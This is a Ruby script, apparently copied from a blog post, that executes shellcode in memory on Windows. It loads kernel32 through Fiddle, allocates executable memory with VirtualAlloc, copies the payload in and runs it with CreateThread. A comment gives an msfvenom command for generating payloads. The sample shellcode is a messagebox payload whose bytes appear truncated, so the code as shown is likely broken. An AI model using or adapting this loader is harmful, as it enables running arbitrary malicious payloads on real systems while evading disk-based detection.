# https://king-sabri.net/how-to-execute-shellcode-using-ruby-on-windows-and-linux/

require 'fiddle'
require 'fiddle/import'
require 'fiddle/types'

# Generate shellcode with something like
# msfvenom -a x86 --platform Windows -p windows/messagebox TEXT="@KINGSABRI" -f ruby --smallest
shellcode =
    "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64" +
    "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e" +
    "\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"

include Fiddle
# Load kernel32.dll class
puts "[-] Loading kernel32.dll"
kernel32 = Fiddle.dlopen('kernel32')

# allocate a virtual memeory for our shellcde
puts "[-] VirtualAlloc"
ptr = Function.new(kernel32['VirtualAlloc'], [4,4,4,4], 4).call(0, shellcode.size, 0x3000, 0x40)

# change the protection of the allocated memory (optional)
Function.new(kernel32['VirtualProtect'], [4,4,4,4], 4).call(ptr, shellcode.size, 0, 0)

# create a buffer that contains our shellcode
puts "[-] Create buffer"
buf = Fiddle::Pointer[shellcode]

# copy the buffer to the allocated our allocated memory
puts "[-] RtlMoveMemory"
Function.new(kernel32['RtlMoveMemory'], [4, 4, 4], 4).call(ptr, buf, shellcode.size)

# create a thread that executes the shellcode that allocated in the memory
puts "[-] CreateThread"
thread = Function.new(kernel32['CreateThread'], [4,4,4,4,4,4], 4).call(0, 0, ptr, 0, 0, 0)

# wait forever for the shellcode thread execution
puts "[-] WaitForSingleObject"
Function.new(kernel32['WaitForSingleObject'], [4,4], 4).call(thread, -1)